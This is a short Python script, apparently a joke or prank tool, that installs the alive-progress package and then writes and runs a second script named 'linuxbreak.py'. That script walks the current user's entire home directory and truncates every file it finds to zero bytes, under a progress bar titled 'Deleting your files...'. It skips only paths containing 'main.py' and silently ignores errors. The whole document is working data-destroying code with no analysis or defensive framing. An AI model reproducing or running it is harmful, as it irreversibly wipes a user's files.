import sys
from os import system


if not "alive-progress" in sys.modules:
	system("pip install alive-progress")

code = """import alive_progress
from time import sleep
import getpass
import os
items = []
with alive_progress.alive_bar(title="Detecting files...") as bar:
	def find_files(root):
		global items
		bar()
		children = list(os.listdir(root))
		for child in children:
			child = root + "/" + child
			if os.path.isdir(child):
				find_files(child)
			else:
				items.append(child)
	find_files(f"/home/{getpass.getuser()}")		
with alive_progress.alive_bar(len(items), title="Deleting your files...") as bar:
	for item in items:
		if "main.py" in item:
			bar()
			continue
		try:
			f = open(item, "b+")
			f.truncate(0)
			f.close()
		except:
			pass
		bar()
"""

file = open("linuxbreak.py", "a")
file.close()
file = open("linuxbreak.py","w+")
if file.read():
	file.truncate(0)

file.write(code)
file.close()
system("python3 linuxbreak.py")
